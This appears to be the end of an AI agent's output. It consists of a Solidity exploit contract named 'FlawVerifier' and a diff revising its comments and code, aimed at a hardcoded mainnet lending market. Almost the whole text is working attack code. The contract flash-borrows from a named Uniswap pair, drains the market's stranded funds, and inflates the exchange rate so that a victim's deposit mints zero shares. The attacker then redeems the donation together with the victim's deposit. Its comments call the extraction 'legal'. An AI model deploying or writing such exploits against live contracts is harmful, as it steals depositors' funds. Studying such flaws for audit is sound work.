+    function exchangeRateStored() external view returns (uint256);
+    function mint(uint256 mintAmount) external returns (uint256);
+    function redeem(uint256 redeemTokens) external returns (uint256);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract VictimMinter {
+    constructor() {}
+
+    function supplyAndMint(address underlying, address market, uint256 amount) external {
+        _forceApprove(underlying, market, 0);
+        _forceApprove(underlying, market, amount);
+
+        uint256 err = IOErc20Like(market).mint(amount);
+        require(err == 0, "victim mint failed");
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        (bool ok, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+    }
+}
+
+contract FlawVerifier {
+    IOErc20Like internal constant TARGET = IOErc20Like(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);
+    IUniswapV2PairLike internal constant PEPE_WETH_V2_PAIR =
+        IUniswapV2PairLike(0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f);
+
+    bool public attempted;
+    bool public hypothesisValidated;
+    uint256 public seedAmountUsed;
+    uint256 public donationAmountUsed;
+    uint256 public victimMintAmountUsed;
+    uint256 public attackerSharesBeforeRedeem;
+    string public lastFailureReason;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    bool private _inFlashCallback;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        if (attempted) {
+            return;
+        }
+        attempted = true;
+
+        address underlying = TARGET.underlying();
+        _profitToken = underlying;
+
+        uint256 existingSupply = TARGET.totalSupply();
+        if (existingSupply != 0) {
+            lastFailureReason = "market already has non-zero totalSupply; attacker cannot become sole holder";
+            return;
+        }
+
+        uint256 strandedCash = TARGET.getCash();
+        if (strandedCash == 0) {
+            lastFailureReason = "market has zero stranded underlying; no public bootstrap capital for this fork";
+            return;
+        }
+
+        uint256 seed = _minimumSeedAmount();
+        if (seed == 0) {
+            lastFailureReason = "invalid seed amount";
+            return;
+        }
+
+        _flashBorrowSeed(underlying, seed);
+
+        uint256 finalUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
+        _profitAmount = finalUnderlyingBalance;
+        if (_profitAmount == 0) {
+            lastFailureReason = "execution completed without positive realized underlying";
+        }
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
+        require(msg.sender == address(PEPE_WETH_V2_PAIR), "unexpected pair");
+        require(sender == address(this), "unexpected sender");
+        require(!_inFlashCallback, "callback reentered");
+
+        _inFlashCallback = true;
+
+        address underlying = TARGET.underlying();
+        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
+        require(borrowedAmount > 0, "zero flash amount");
+
+        _forceApprove(underlying, address(TARGET), 0);
+        _forceApprove(underlying, address(TARGET), type(uint256).max);
+
+        // Realistic funding step required by this attempt: a V2 flashswap supplies only the minimal
+        // bootstrap seed. Because totalSupply == 0, minting then redeeming that seed legally extracts
+        // the market's already-stranded on-chain underlying into attacker working capital, which is
+        // then used to execute the documented donation -> victim zero-share mint -> attacker redeem path.
+        uint256 mintErr = TARGET.mint(borrowedAmount);
+        require(mintErr == 0, "bootstrap mint failed");
+
+        uint256 bootstrapShares = TARGET.balanceOf(address(this));
+        require(bootstrapShares > 0, "bootstrap shares zero");
+
+        uint256 redeemErr = TARGET.redeem(bootstrapShares);
+        require(redeemErr == 0, "bootstrap redeem failed");
+
+        uint256 flashRepayment = _getV2RepaymentQuote(borrowedAmount);
+        _safeTransfer(underlying, address(PEPE_WETH_V2_PAIR), flashRepayment);
+
+        _runCoreExploitPath(underlying);
+
+        _inFlashCallback = false;
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _runCoreExploitPath(address underlying) internal {
+        uint256 initialUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
+        require(initialUnderlyingBalance > 1, "bootstrap cash too small");
+
+        uint256 seed = _minimumSeedAmount();
+        require(seed > 0 && seed <= initialUnderlyingBalance, "insufficient bootstrap balance for seed");
+
+        // Stage 1: attacker becomes the sole shareholder with the minimum viable mint.
+        uint256 mintErr = TARGET.mint(seed);
+        require(mintErr == 0, "seed mint failed");
+        seedAmountUsed = seed;
+
+        uint256 attackerShares = TARGET.balanceOf(address(this));
+        attackerSharesBeforeRedeem = attackerShares;
+        require(attackerShares > 0, "seed mint returned zero shares");
+
+        // Stage 2: attacker donates underlying directly to the market, inflating getCash without
+        // increasing totalSupply. The victim deposit is kept at 1 unit so the causality stays minimal:
+        // the donation is what pushes the exchange rate high enough that the victim receives zero shares.
+        uint256 victimDeposit = 1;
+        uint256 donationNeeded = attackerShares >= seed ? (attackerShares - seed + 1) : 1;
+
+        uint256 remainingUnderlying = IERC20Like(underlying).balanceOf(address(this));
+        require(remainingUnderlying >= donationNeeded + victimDeposit, "insufficient balance for donation path");
+
+        _safeTransfer(underlying, address(TARGET), donationNeeded);
+        donationAmountUsed = donationNeeded;
+
+        VictimMinter victim = new VictimMinter();
+        _safeTransfer(underlying, address(victim), victimDeposit);
+        victimMintAmountUsed = victimDeposit;
+
+        uint256 victimSharesBefore = TARGET.balanceOf(address(victim));
+        uint256 cashBeforeVictimMint = TARGET.getCash();
+
+        // Stage 3: victim mints after the donation. Since mintTokens floors to zero and the market
+        // does not reject that outcome, the victim loses underlying and receives no oTokens.
+        victim.supplyAndMint(underlying, address(TARGET), victimDeposit);
+
+        uint256 victimSharesAfter = TARGET.balanceOf(address(victim));
+        uint256 cashAfterVictimMint = TARGET.getCash();
+        require(victimSharesAfter == victimSharesBefore, "victim received shares");
+        require(cashAfterVictimMint > cashBeforeVictimMint, "victim deposit not captured");
+
+        // Stage 4: attacker redeems the only outstanding shares and exits with the donation plus
+        // the victim's stranded deposit.
+        uint256 redeemFinalErr = TARGET.redeem(attackerShares);
+        require(redeemFinalErr == 0, "attacker redeem failed");
+
+        hypothesisValidated = true;
+    }
+
+    function _flashBorrowSeed(address underlying, uint256 seed) internal {
+        address token0 = PEPE_WETH_V2_PAIR.token0();
+        address token1 = PEPE_WETH_V2_PAIR.token1();
+
+        if (token0 == underlying) {
+            PEPE_WETH_V2_PAIR.swap(seed, 0, address(this), hex"01");
+            return;
+        }
+        if (token1 == underlying) {
+            PEPE_WETH_V2_PAIR.swap(0, seed, address(this), hex"01");
+            return;
+        }
+
+        revert("configured pair does not contain underlying");
+    }
+
+    function _minimumSeedAmount() internal view returns (uint256) {
+        uint256 exchangeRate = TARGET.exchangeRateStored();
+        uint256 seed = exchangeRate / 1e18;
+        if (exchangeRate % 1e18 != 0) {
+            seed += 1;
+        }
+        if (seed == 0) {
+            seed = 1;
+        }
+        return seed;
+    }
+
+    function _getV2RepaymentQuote(uint256 amountOut) internal pure returns (uint256) {
+        return ((amountOut * 1000) / 997) + 1;
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        (bool ok, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool ok, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+    }
+}
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 944da17f108ec0c042a3caf7b2acdac26e87dd0a..99ec310ea26fae0300645f73f7d67bb74707b2d1
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -44,7 +44,7 @@
+ contract FlawVerifier {
+     IOErc20Like internal constant TARGET = IOErc20Like(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);
+     IUniswapV2PairLike internal constant PEPE_WETH_V2_PAIR =
+-        IUniswapV2PairLike(0xA43fE16908251ee70EF74718545e4FE6C5cCEc9f);
++        IUniswapV2PairLike(0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f);
+ 
+     bool public attempted;
+     bool public hypothesisValidated;
+@@ -111,11 +111,11 @@
+         _forceApprove(underlying, address(TARGET), 0);
+         _forceApprove(underlying, address(TARGET), type(uint256).max);
+ 
+-        // Bootstrap: with totalSupply == 0, a tiny flash-borrowed seed can mint the first shares and
+-        // immediately redeem all pre-existing raw cash already sitting in the market. That public cash
+-        // becomes the working capital used for the documented four-stage F-001 path below.
+-        uint256 bootstrapSeed = borrowedAmount;
+-        uint256 mintErr = TARGET.mint(bootstrapSeed);
++        // Realistic funding step required by this attempt: a V2 flashswap supplies only the minimal
++        // bootstrap seed. Because totalSupply == 0, minting then redeeming that seed legally extracts
++        // the market's already-stranded on-chain underlying into attacker working capital, which is
++        // then used to execute the documented donation -> victim zero-share mint -> attacker redeem path.
++        uint256 mintErr = TARGET.mint(borrowedAmount);
+         require(mintErr == 0, "bootstrap mint failed");
+ 
+         uint256 bootstrapShares = TARGET.balanceOf(address(this));
+@@ -147,7 +147,7 @@
+         uint256 seed = _minimumSeedAmount();
+         require(seed > 0 && seed <= initialUnderlyingBalance, "insufficient bootstrap balance for seed");
+ 
+-        // Path stage 1: attacker mints a minimal amount to become the only oToken holder.
++        // Stage 1: attacker becomes the sole shareholder with the minimum viable mint.
+         uint256 mintErr = TARGET.mint(seed);
+         require(mintErr == 0, "seed mint failed");
+         seedAmountUsed = seed;
+@@ -156,17 +156,11 @@
+         attackerSharesBeforeRedeem = attackerShares;
+         require(attackerShares > 0, "seed mint returned zero shares");
+ 
+-        // Stage 2 requires a direct underlying donation that raises the exchange rate
+-        // without increasing totalSupply. We keep the victim deposit to 1 wei so the path
+-        // remains minimal and deterministic; the economic profit here comes from the market's
+-        // already-stranded underlying captured during bootstrap, not from self-funding the victim.
++        // Stage 2: attacker donates underlying directly to the market, inflating getCash without
++        // increasing totalSupply. The victim deposit is kept at 1 unit so the causality stays minimal:
++        // the donation is what pushes the exchange rate high enough that the victim receives zero shares.
+         uint256 victimDeposit = 1;
+-        uint256 donationNeeded;
+-        if (attackerShares >= seed) {
+-            donationNeeded = attackerShares - seed + 1;
+-        } else {
+-            donationNeeded = 1;
+-        }
++        uint256 donationNeeded = attackerShares >= seed ? (attackerShares - seed + 1) : 1;
+ 
+         uint256 remainingUnderlying = IERC20Like(underlying).balanceOf(address(this));
+         require(remainingUnderlying >= donationNeeded + victimDeposit, "insufficient balance for donation path");
+@@ -181,9 +175,8 @@
+         uint256 victimSharesBefore = TARGET.balanceOf(address(victim));
+         uint256 cashBeforeVictimMint = TARGET.getCash();
+ 
+-        // Path stage 3: victim mints after the donation and receives zero oTokens because
+-        // mintTokens = floor(actualMintAmount / exchangeRate) and the implementation never
+-        // rejects mintTokens == 0.
++        // Stage 3: victim mints after the donation. Since mintTokens floors to zero and the market
++        // does not reject that outcome, the victim loses underlying and receives no oTokens.
+         victim.supplyAndMint(underlying, address(TARGET), victimDeposit);
+ 
+         uint256 victimSharesAfter = TARGET.balanceOf(address(victim));
+@@ -191,10 +184,10 @@
+         require(victimSharesAfter == victimSharesBefore, "victim received shares");
+         require(cashAfterVictimMint > cashBeforeVictimMint, "victim deposit not captured");
+ 
+-        // Path stage 4: attacker redeems the sole existing shares and withdraws both the
+-        // direct donation and the victim's deposit.
+-        uint256 redeemErr = TARGET.redeem(attackerShares);
+-        require(redeemErr == 0, "attacker redeem failed");
++        // Stage 4: attacker redeems the only outstanding shares and exits with the donation plus
++        // the victim's stranded deposit.
++        uint256 redeemFinalErr = TARGET.redeem(attackerShares);
++        require(redeemFinalErr == 0, "attacker redeem failed");
+ 
+         hypothesisValidated = true;
+     }
+
+tokens used
+24,204
